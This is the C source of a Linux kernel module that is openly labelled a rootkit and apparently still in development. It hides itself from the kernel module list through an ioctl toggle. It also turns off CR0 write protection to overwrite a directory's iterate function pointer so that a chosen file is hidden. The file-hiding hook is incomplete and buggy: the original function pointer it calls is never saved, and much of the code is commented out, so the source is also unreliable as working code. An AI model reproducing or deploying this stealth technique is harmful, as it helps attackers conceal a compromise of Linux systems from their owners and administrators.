#include <linux/module.h>	/* Needed by all modules */
#include <linux/kernel.h>	/* Needed for KERN_INFO */
#include <linux/init.h>		/* Needed for the macros */
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/mount.h>
#include <linux/slab.h>
#include <linux/kobject.h>
#include <linux/delay.h>

#include <asm/uaccess.h>

#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kha");

#define DEVICE_NAME "rootkit"
#define SUCCESS 0
#define BUF_LEN 80

// Global variables
static int device_open_num = 0;
static char msg[BUF_LEN];
static char *msg_ptr;
static bool hide = false;
//static int device_open (struct inode *, struct file *);
//static int device_release (struct inode*, struct file*);
//static ssize_t device_read(struct file *, char __user *, size_t, loff_t *);
//static ssize_t device_write(struct file*,const char __user *, size_t, loff_t*);
//static ssize_t device_ioctl(	
//			struct file *,	
//			unsigned int ,
//			unsigned long ); 


// Methods
static ssize_t device_read(struct file * file
			   , char __user* buffer
			   , size_t length
			   , loff_t * offset){
  int bytes_read = 0;
  if (*msg_ptr == 0)
    return 0;

  while (length && *msg_ptr){
    put_user(*(msg_ptr++), buffer++);
    length--;
    bytes_read++;
  }
  printk(KERN_INFO "Read %d bytes, %ld left\n", bytes_read, length);
  return bytes_read;
}

static ssize_t device_write(struct file * file
			    , const char __user * buffer
			    , size_t length
			    , loff_t * offset){
  int i;
  //printk(KERN_INFO "device_write(%p,%s,%ld)", file, buffer, length);
  printk(KERN_INFO "device_write");
  for(i=0; i< length && i< BUF_LEN; i++){
    get_user(msg[i], buffer+i);
  }
  msg_ptr = msg;
  return i;
  //return 0;
}

static int device_open(struct inode* inode, struct file* file){
  //  static int counter = 0;
  printk(KERN_INFO "device_open(%p)\n", file);
  if(device_open_num)
    return -EBUSY;
  
  device_open_num++;
  msg_ptr = msg;
  try_module_get(THIS_MODULE);
  return SUCCESS;
}

static int device_release(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "device_release(%p,%p)\n", inode, file);
  device_open_num--;		/* We're now ready for our next caller */

  module_put(THIS_MODULE);
  return SUCCESS;
}

struct list_head *module_list_prev;
struct list_head *module_list_next;
static void hide_module(void){
   /*Hide the module*/
  printk(KERN_INFO "Hiding module");
  module_list_prev = (&__this_module.list)->prev;
  module_list_next = (&__this_module.list)->next;
  list_del_init(&__this_module.list);
  // module_list = THIS_MODULE->list.prev;
  //list_del(module_list);
  //kobject_del(&THIS_MODULE->mkobj.kobj);
}
static void unhide_module(void){
  printk (KERN_INFO "Unhiding module");
  //list_add(&__this_module.list, module_list_prev);
  //list_add_tail(&__this_module.list, module_list_next);
  __list_add(&__this_module.list, module_list_prev, module_list_next);
}
static ssize_t device_ioctl(	/* see include/linux/fs.h */
			    struct file *file,	/* ditto */
			    unsigned int ioctl_num,	/* number and param for ioctl */
			    unsigned long ioctl_param)
{
  int i;
  char *temp;
  char ch;
  /* 
   * Switch according to the ioctl called 
   */
  switch (ioctl_num) {
  case IOCTL_SET_MSG:
    /* 
     * Receive a pointer to a message (in user space) and set that
     * to be the device's message.  Get the parameter given to 
     * ioctl by the process. 
     */
    temp = (char *)ioctl_param;

    /* 
     * Find the length of the message 
     */
    get_user(ch, temp);
    for (i = 0; ch && i < BUF_LEN; i++, temp++)
      get_user(ch, temp);

    device_write(file, (char *)ioctl_param, i, 0);
    break;

  case IOCTL_GET_MSG:
    /* 
     * Give the current message to the calling process - 
     * the parameter we got is a pointer, fill it. 
     */
    i = device_read(file, (char *)ioctl_param, 99, 0);

    /* 
     * Put a zero at the end of the buffer, so it will be 
     * properly terminated 
     */
    put_user('\0', (char *)ioctl_param + i);
    break;

  case IOCTL_GET_NTH_BYTE:
    return msg[ioctl_param];
    break;
    
  case IOCTL_TOGGLE_HIDE_MODULE:
    hide = !hide;
    if(hide)
      hide_module();
    else
      unhide_module();
    //hide = !hide;
    return SUCCESS;
    break;
    
  }
    
  return SUCCESS;
}

struct file_operations fops ={
			      .read = device_read
			      , .write = device_write
			      , .unlocked_ioctl = device_ioctl
			      , .open = device_open
			      , .release = device_release				     
};
/**************************HIDE FILE(OBSOLETE)***************************************/

/*
  struct dentry* g_parent_dentry;
  struct path g_root_path;
  int g_inode_count = 0;
  unsigned long* g_inode_numbers;

  void** g_old_parent_inode_pointer;
  void** g_old_parent_fop_pointer;

  filldir_t real_filldir; 
*/


/* static void allocate_memory(void) */
/* { */
/*   //g_old_inode_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
/*   // g_old_fop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
/*   // g_old_iop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */

/*   g_old_parent_inode_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
/*   g_old_parent_fop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
           
/*   g_inode_numbers=(unsigned long*)kmalloc(sizeof(unsigned long),GFP_KERNEL); */

/* } */
/* static void reallocate_memmory(void) */
/* { */
/*   /\*Realloc memmory for inode number*\/ */
/*   g_inode_numbers=(unsigned long*)krealloc(g_inode_numbers,sizeof(unsigned long*)*(g_inode_count+1), GFP_KERNEL); */
	
/*   // /\*Realloc memmory for old pointers*\/ */
/*   // g_old_inode_pointer=(void*)krealloc(g_old_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
/*   // g_old_fop_pointer=(void*)krealloc(g_old_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
/*   // g_old_iop_pointer=(void*)krealloc(g_old_iop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */

/*   g_old_parent_inode_pointer=(void*)krealloc(g_old_parent_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
/*   g_old_parent_fop_pointer=(void*)krealloc(g_old_parent_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
/* } */

/*
  static int new_filldir (void *buf,
  const char *name,
  int namelen,
  loff_t offset,
  u64 ux64,
  unsigned ino){
  unsigned int i = 0;
  struct dentry* p_dentry;
  struct qstr current_name;
  current_name.name = name;
  current_name.len = namelen;
  current_name.hash = full_name_hash (NULL,name, namelen);

  p_dentry = d_lookup(g_parent_dentry, &current_name);

  if (p_dentry!=NULL){
  for(i = 0; i<= g_inode_count - 1; i++){
  if (g_inode_numbers[i] == p_dentry->d_inode->i_ino)
  return 0;
  }
  }
  }
  static int new_parent_readdir(struct file* file,
  void* dirent,
  filldir_t filldir){
  g_parent_dentry = file->f_path.dentry;
  real_filldir = filldir;
  return  0;
  }

*/

/*
  static struct file_operations new_parent_fops =
  {
  .owner=THIS_MODULE,
  .readdir=new_parent_readdir,
  };
*/
/******************************OBSOLETE********************************/




/* unsigned long hook_functions(const char* file_path){ */
/*   int error = 0; */
/*   struct path path; */

/*   error = kern_path("/root", LOOKUP_FOLLOW, &g_root_path); */
/*   if(error){ */
/*     printk( KERN_ALERT "Can't access root\n"); */
/*     return -1; */
/*   } */
  
/*   error = kern_path("/root", LOOKUP_FOLLOW, &path); */
/*   if(error){ */
/*     printk( KERN_ALERT "Can't access file\n"); */
/*     return -1; */
/*   } */
/*   if (g_inode_count==0) */
/*     { */
/*       allocate_memory(); */
/*     } */

/*   if (g_inode_numbers==NULL) */
/*     { */
/*       printk( KERN_ALERT "Not enough memmory in buffer\n"); */
/*       return -1; */
/*     } */

/*   /\*Save pointers*\/ */
/*   g_old_parent_inode_pointer[g_inode_count]=path.dentry->d_parent->d_inode; */
/*   g_old_parent_fop_pointer[g_inode_count]=(void *)path.dentry->d_parent->d_inode->i_fop; */

/*   /\*Save inode number*\/ */
/*   g_inode_numbers[g_inode_count]=path.dentry->d_inode->i_ino; */
/*   g_inode_count=g_inode_count+1; */

/*   reallocate_memmory(); */
/*   /\*filldir hook*\/ */
/*   path.dentry->d_parent->d_inode->i_fop=&new_parent_fops; */

/*   // /\* Hook of commands for file*\/ */
/*   // path.dentry->d_inode->i_op=&new_iop; */
/*   // path.dentry->d_inode->i_fop=&new_fop; */
/* } */
/* /\*unsigned long backup_functions(void){ */
/*   int i = 0; */
/*   struct inode* p_inode; */
/*   struct inode* p_parent_inode; */

/*   for (i = 0; i< g_inode_count; i++){ */
/*   p_inode = g_old_inode_pointer[(g_inode_count-1)-i]; */


/*   p_parent_inode=g_old_parent_inode_pointer[(g_inode_count-1)-i]; */
/*   p_parent_inode->i_fop=(void *)g_old_parent_fop_pointer[(g_inode_count-1)-i]; */
/*   } */
/*   return 0 */
/*   }*\/ */

/**********************NEW HIDE FILE************************************/

// Runtime var
struct dentry* g_parent_dentry;
filldir_t original_filldir;
int (*original_iterate)(struct file *, struct dir_context *);
const struct file_operations *original_parent_fops;
// List
struct inode_to_hide {
  unsigned long inode_number;
  void* parent_inode_pointer;
  void* old_parent_fop; 
  struct list_head list;
};

LIST_HEAD(inode_to_hide_list);

static int new_parent_filldir(struct dir_context* context,
			      const char* name,
			      int namelen,
			      loff_t offset,
			      u64 ino,
			      unsigned int d_type){
  printk(KERN_INFO "New filldir\n");
  /* struct dentry* p_dentry; */
  /* struct qstr current_name; */
  /* struct inode_to_hide* p; */
  /* current_name.name = name; */
  /* current_name.len = namelen; */
  /* current_name.hash = full_name_hash (NULL, name, namelen); */
  /* p_dentry = d_lookup(g_parent_dentry, &current_name); */

  /* /\* if (p_dentry!=NULL){ *\/ */
  /* /\*   for(i = 0; i<= g_inode_count - 1; i++){ *\/ */
  /* /\*     if (g_inode_numbers[i] == p_dentry->d_inode->i_ino) *\/ */
  /* /\* 	return 0; *\/ */
  /* /\*   } *\/ */
  /* /\* } *\/ */

  /* // Search in list */
  /* if(p_dentry != NULL){ */
  /*   list_for_each_entry(p, &inode_to_hide_list, list){ */
  /*     if(p -> inode_number == p_dentry->d_inode-> i_ino ) */
  /* 	return 0; */
  /*   } */

  /* } */
  // Return original if not in file list
  return original_filldir(context, name, namelen, offset, ino, d_type);
}

static int new_parent_iterate(struct file *, struct dir_context *);
static struct file_operations new_parent_fops = {
						 .iterate = new_parent_iterate,
};
int (*original_iterate)(struct file *file, struct dir_context *context);

static int new_parent_iterate(struct file *file, struct dir_context *context){
  printk(KERN_INFO "New iterate!!!!!!!!!\n");
  int ret = 0;
  //printk(KERN_INFO "f_op -> iterate: %p\n", file->f_op->iterate);
  //printk(KERN_INFO "original_iterate: %p\n", original_iterate);
  // original_filldir = context->actor;
  //g_parent_dentry = file->f_path.dentry;
  //*((filldir_t*)&context->actor) = new_parent_filldir;
  //ret = g_root_path.dentry->d_inode->i_fop->iterate(file, context);
  // ret = file->f_path.dentry->d_inode->i_fop->iterate(file, context);

  // Unhook
  // g_parent_dentry->d_inode->i_fop = original_parent_fops;
  // Original function
  // ret = original_parent_fops->iterate(file,context);
  //ret =  g_parent_dentry->d_inode->i_fop->iterate(file,context);
  // ret = file->f_op->iterate(file,context);
  // Rehook
  //g_parent_dentry->d_inode->i_fop.iterate = &new_parent_fops;

  //ret = file->f_op->iterate(file,context);
  // ret = original_iterate(file,context);
  // ret = original_fops->iterate(file,context);
  return original_iterate(file,context);
  //return 0;
}

	  
#define DISABLE_W_PROTECTED_MEMORY		\
  do {						\
    preempt_disable();				\
    write_cr0(read_cr0() & (~ 0x10000));	\
  } while (0);
#define ENABLE_W_PROTECTED_MEMORY		\
  do {						\
    preempt_enable();				\
    write_cr0(read_cr0() | 0x10000);		\
  } while (0);
static inline void
write_cr0_forced(unsigned long val)
{
  unsigned long __force_order;
  
  /* __asm__ __volatile__( */
  asm volatile(
	       "mov %0, %%cr0"
	       : "+r"(val), "+m"(__force_order));
}

static inline void
protect_memory(void)
{
  printk(KERN_INFO "Protecting memory");
  write_cr0_forced(read_cr0()|0x00010000);
}

static inline void
unprotect_memory(void)
{
  printk(KERN_INFO "Unprotecting  memory");
  unsigned long cr0 = read_cr0();
  write_cr0_forced(cr0 & ~0x00010000);
}
static int hide_file_hook (const char* file_path){
  int error = 0;
  //struct file* file;

  struct path path;
  struct inode_to_hide* inode_entry;
  /* error = kern_path("/", LOOKUP_FOLLOW, &g_root_path); */
  /* if(error){ */
  /*   printk( KERN_ALERT "Can't access root\n"); */
  /*   return -1; */
  /* } */
  printk(KERN_INFO "hooking fop file: %s\n", file_path);
  error = kern_path(file_path, LOOKUP_FOLLOW, &path);
  if (error){
    printk( KERN_ALERT "Can't access file\n");
    return -1;
  }
  /* printk(KERN_INFO "Got inode: %ld", path.dentry->d_inode->i_ino); */
  /* if ((file = filp_open(file_path, O_RDONLY, 0)) == NULL) { */
  /*       return -1; */
  /* } */
  
  // Save inode
  /* inode_entry = kmalloc(sizeof(struct inode_to_hide), GFP_KERNEL); */
  /* if(!inode_entry) */
  /*   return -1; */
  
  /* inode_entry->inode_number = path.dentry->d_inode->i_ino; */
  /* inode_entry->old_parent_fop = path.dentry->d_parent->d_inode->i_fop; */
  /* inode_entry->parent_inode_pointer = path.dentry->d_parent->d_inode; */

  /* list_add(&inode_entry->list, &inode_to_hide_list); */
  
  // Hooking fop of parent
  //DISABLE_W_PROTECTED_MEMORY
  //original_iterate = path.dentry->d_parent->d_inode->i_fop->iterate;
  
  g_parent_dentry = path.dentry->d_parent;
  //original_parent_fops = g_parent_dentry->d_inode->i_fop;
  //original_iterate = g_parent_dentry->d_inode->i_fop->iterate;
  //  g_parent_dentry->d_inode->i_fop = &new_parent_fops;
  //DISABLE_W_PROTECTED_MEMORY
  printk(KERN_INFO "new_parent_iterate: %p\n",&new_parent_iterate);
  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n", g_parent_dentry->d_inode->i_fop->iterate);


  unprotect_memory();

  unsigned long * ptr = (unsigned long *) &g_parent_dentry->d_inode->i_fop->iterate;
  //printk(KERN_INFO "ptr: %p\n",ptr);
  *ptr = (unsigned long *) &new_parent_iterate; 
  //g_parent_dentry->d_inode->i_fop->iterate = &new_parent_iterate;
  //ENABLE_W_PROTECTED_MEMORY;
  protect_memory();
  //printk(KERN_INFO "ptr: %p\n",*ptr);
  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n", g_parent_dentry->d_inode->i_fop->iterate);
  
  //path.dentry->d_parent->d_inode->i_fop->iterate = &new_parent_iterate;
  //ENABLE_W_PROTECTED_MEMORY
  //DISABLE_W_PROTECTED_MEMORY
  //printk (KERN_INFO "before:%p" ,file->f_op);
  //file->f_path.dentry->d_parent->d_inode->i_fop = &new_parent_fops;
  //printk (KERN_INFO "after:%p" ,file->f_op);
  //ENABLE_W_PROTECTED_MEMORY
  return SUCCESS;
}

static int backup_hooks (void){
  struct inode_to_hide  *p, *tmp;
  struct inode* p_inode;
  list_for_each_entry(p, &inode_to_hide_list, list){
    p_inode = p->parent_inode_pointer;
    p_inode->i_fop = p->old_parent_fop;
  }
  msleep(10);
  list_for_each_entry_safe(p, tmp, &inode_to_hide_list, list ){
    list_del(&p->list);
    kfree(p);
  }
  return SUCCESS;
}

static char* test_path_name = "/home/dalo2903/Test/test.c";

// Rootkit init & exit
static int __init rootkit_init(void)
{
  int ret_val;
  // list_del_init(&__this_module.list);
  ret_val = hide_file_hook(test_path_name);
  if (ret_val < 0){
    printk(KERN_ALERT "Hook failed\n");
    return ret_val;
  }
 
  ret_val = register_chrdev(MAJOR_NUM, DEVICE_FILE_NAME, &fops);
  if (ret_val < 0) {
    printk(KERN_ALERT "%s failed with %d\n",
	   "Sorry, registering the character device\n ", ret_val);
    return ret_val;
  }

  printk(KERN_INFO "%s The major device number is %d.\n",
	 "Registeration is a success", MAJOR_NUM);
  printk(KERN_INFO "mknod %s c %d 0\n", DEVICE_FILE_NAME, MAJOR_NUM);
  sprintf(msg, "Starting text\n");
  return 0;
}

static void __exit rootkit_exit(void)
{
  // backup_hooks();
  unregister_chrdev(MAJOR_NUM, DEVICE_FILE_NAME);
  
  printk(KERN_INFO "Rootkit unloaded\n");
 
  return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);
